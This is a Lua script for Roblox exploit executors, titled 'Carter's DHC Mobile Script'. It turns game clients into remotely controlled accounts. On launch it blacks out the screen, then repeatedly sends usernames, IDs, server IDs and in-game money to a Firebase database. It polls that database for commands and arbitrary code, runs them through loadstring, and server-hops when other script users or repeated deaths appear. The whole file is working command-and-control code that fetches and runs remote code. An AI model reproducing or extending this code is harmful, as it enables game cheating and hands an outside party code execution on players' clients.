-- Carter's DHC Mobile Script (Fully Updated)
-- Designed for Delta and other mobile executors

---------------------------------------------------
-- 🟢 Utility Functions
---------------------------------------------------

-- Get player info for tracking
local function getPlayerInfo()
    local player = game.Players.LocalPlayer
    if player then
        return {
            username = player.Name,
            userid = player.UserId,
            serverid = game.JobId,
            placeid = game.PlaceId,
            status = "connected"
        }
    end
    return nil
end

-- Function to make screen black
local function makeScreenBlack()
    if game:GetService("CoreGui") then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreenGui"
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui
        
        screenGui.Parent = game:GetService("CoreGui")
    end
end

-- Universal HTTP request wrapper
local function makeRequest(options)
    local requestFunc = syn and syn.request
        or http and http.request
        or http_request
        or request
        or fluxus and fluxus.request

    if requestFunc then
        local ok, result = pcall(function() return requestFunc(options) end)
        if ok then return result else return nil end
    else
        warn("[makeRequest] No HTTP function available.")
        return nil
    end
end

---------------------------------------------------
-- 🟢 Globals
---------------------------------------------------

local commandWorkspace = {}

local altConfig = {
    avoidDuplicates = true,
    deathProtection = true,
    deathThreshold = 6,
    deathTimeWindow = 2, -- minutes
    executeAtStartup = true,
    deathCount = 0,
    deathTimer = 0,
    knownUsers = {}
}

local analytics = {
    money = 0,
    wantedLevel = 0,
    startMoney = 0,
    moneyGained = 0,
    lastUpdate = 0
}

local consoleLogs = {}
local MAX_CONSOLE_LOGS = 100

---------------------------------------------------
-- 🟢 Console Logging
---------------------------------------------------

local function logToConsole(message, level)
    level = level or "info"
    local timestamp = os.date("%H:%M:%S")
    local logEntry = {
        message = message,
        level = level,
        timestamp = timestamp
    }
    
    table.insert(consoleLogs, logEntry)
    if #consoleLogs > MAX_CONSOLE_LOGS then
        table.remove(consoleLogs, 1)
    end
    
    local playerInfo = getPlayerInfo()
    if playerInfo then
        makeRequest({
            Url = "https://omebgle-default-rtdb.firebaseio.com/console/" .. playerInfo.userid .. ".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode(logEntry)
        })
    end
end

---------------------------------------------------
-- 🟢 Config & Firebase
---------------------------------------------------

local function loadConfiguration()
    local url = "https://omebgle-default-rtdb.firebaseio.com/config.json"
    local res = makeRequest({ Url = url, Method = "GET" })
    if res and res.Body then
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        if data then
            for key, value in pairs(data) do
                if altConfig[key] ~= nil then
                    altConfig[key] = value
                end
            end
            logToConsole("Configuration loaded from Firebase", "info")
        end
    else
        logToConsole("Failed to load configuration", "error")
    end
end

local function sendPlayerInfo()
    local info = getPlayerInfo()
    if info then
        makeRequest({
            Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. info.userid .. ".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode(info)
        })
    end
end

local function sendHeartbeat()
    local info = getPlayerInfo()
    if info then
        makeRequest({
            Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. info.userid .. ".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({
                timestamp = os.time(),
                userid = info.userid
            })
        })
    end
end

---------------------------------------------------
-- 🟢 Server Hop
---------------------------------------------------

local function serverHop()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local placeId = game.PlaceId
    local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
    
    local res = makeRequest({ Url = serversUrl, Method = "GET" })
    if not (res and res.Body) then
        logToConsole("Failed to fetch server list", "error")
        return
    end
    
    local data = HttpService:JSONDecode(res.Body)
    if not (data and data.data) then return end
    
    local servers = {}
    for _, s in ipairs(data.data) do
        if s.id ~= game.JobId and s.playing < s.maxPlayers then
            table.insert(servers, s)
        end
    end
    
    if #servers > 0 then
        local target = servers[math.random(1, #servers)]
        logToConsole("Server hopping to: " .. target.id, "info")
        TeleportService:TeleportToPlaceInstance(placeId, target.id)
    else
        logToConsole("No available servers found", "warn")
    end
end

---------------------------------------------------
-- 🟢 Features
---------------------------------------------------

-- Check for duplicate users
local function checkForDuplicateUsers()
    if not altConfig.avoidDuplicates then return end
    
    local info = getPlayerInfo()
    if not info then return end
    
    local url = "https://omebgle-default-rtdb.firebaseio.com/players.json"
    local res = makeRequest({ Url = url, Method = "GET" })
    if res and res.Body then
        local players = game:GetService("HttpService"):JSONDecode(res.Body)
        for userId, userData in pairs(players) do
            if userId ~= tostring(info.userid) and userData and userData.serverid == info.serverid then
                logToConsole("Duplicate script user detected: " .. userData.username, "warn")
                serverHop()
                return
            end
        end
    end
end

-- Update analytics
local function updateAnalyticsData()
    local player = game.Players.LocalPlayer
    if not player then return end
    
    local currentMoney, currentWanted = 0, 0
    pcall(function()
        if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Currency") then
            currentMoney = player.DataFolder.Currency.Value
        end
    end)
    pcall(function()
        if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Information") and player.DataFolder.Information:FindFirstChild("Wanted") then
            currentWanted = player.DataFolder.Information.Wanted.Value
        end
    end)
    
    if analytics.startMoney == 0 then
        analytics.startMoney = currentMoney
        analytics.money = currentMoney
        logToConsole("Starting money: $" .. currentMoney, "info")
    end
    
    analytics.money = currentMoney
    analytics.wantedLevel = currentWanted
    analytics.moneyGained = currentMoney - analytics.startMoney
    
    if tick() - analytics.lastUpdate > 30 then
        analytics.lastUpdate = tick()
        local info = getPlayerInfo()
        if info then
            makeRequest({
                Url = "https://omebgle-default-rtdb.firebaseio.com/analytics/" .. info.userid .. ".json",
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = game:GetService("HttpService"):JSONEncode({
                    username = info.username,
                    money = analytics.money,
                    wantedLevel = analytics.wantedLevel,
                    moneyGained = analytics.moneyGained,
                    lastUpdate = os.time(),
                    serverId = game.JobId
                })
            })
        end
    end
end

-- Check & execute scripts from Firebase
local function checkAndExecuteScript()
    local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"
    local res = makeRequest({ Url = url, Method = "GET" })
    if res and res.Body then
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        if data and data.code and data.code ~= "" then
            table.insert(commandWorkspace, data.code)
            logToConsole("Script added to workspace from Firebase", "info")
            makeRequest({
                Url = url,
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = '{"code":""}'
            })
        end
    end
end

-- Commands listener
local function checkCommands(userId)
    local url = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
    local res = makeRequest({ Url = url, Method = "GET" })
    if res and res.Body then
        local data = game:GetService("HttpService"):JSONDecode(res.Body)
        if data and data.command and data.command ~= "" then
            if data.command == "execute-custom" and data.script then
                table.insert(commandWorkspace, data.script)
            else
                table.insert(commandWorkspace, data.command)
            end
            logToConsole("Command added to workspace: " .. tostring(data.command), "info")
            makeRequest({
                Url = url,
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = '{"command":""}'
            })
        end
    end
end

-- Process commands
local function processCommandsFromWorkspace()
    while #commandWorkspace > 0 do
        local cmd = table.remove(commandWorkspace, 1)
        if cmd == "re-execute" then
            checkAndExecuteScript()
        elseif cmd == "leave" then
            game:Shutdown()
        elseif cmd == "rejoin" then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
        elseif cmd == "serverhop" then
            serverHop()
        else
            local ok, err = pcall(function() loadstring(cmd)() end)
            if not ok then logToConsole("Custom script execution error: " .. tostring(err), "error") end
        end
        wait(1)
    end
end

-- Death protection
local function setupDeathProtection()
    if not altConfig.deathProtection then return end
    local player = game.Players.LocalPlayer
    player.CharacterAdded:Connect(function(c)
        local h = c:WaitForChild("Humanoid")
        h.Died:Connect(function()
            local now = tick()
            if now - altConfig.deathTimer > (altConfig.deathTimeWindow * 60) then
                altConfig.deathCount = 0
                altConfig.deathTimer = now
            end
            altConfig.deathCount += 1
            logToConsole("Death count: " .. altConfig.deathCount .. "/" .. altConfig.deathThreshold, "warn")
            if altConfig.deathCount >= altConfig.deathThreshold then
                logToConsole("Too many deaths detected, server hopping...", "warn")
                serverHop()
            end
        end)
    end)
end

---------------------------------------------------
-- 🟢 Init
---------------------------------------------------

makeScreenBlack()
loadConfiguration()
sendPlayerInfo()
setupDeathProtection()

if altConfig.executeAtStartup then
    checkAndExecuteScript()
end

local info = getPlayerInfo()
if info then
    spawn(function()
        while true do
            wait(10)
            sendHeartbeat()
            sendPlayerInfo()
            checkCommands(info.userid)
            checkForDuplicateUsers()
            updateAnalyticsData()
            processCommandsFromWorkspace()
        end
    end)
    spawn(function()
        while true do
            wait(5)
            processCommandsFromWorkspace()
        end
    end)
end

logToConsole("✅ Carter's DHC Mobile Controller loaded successfully!", "info")
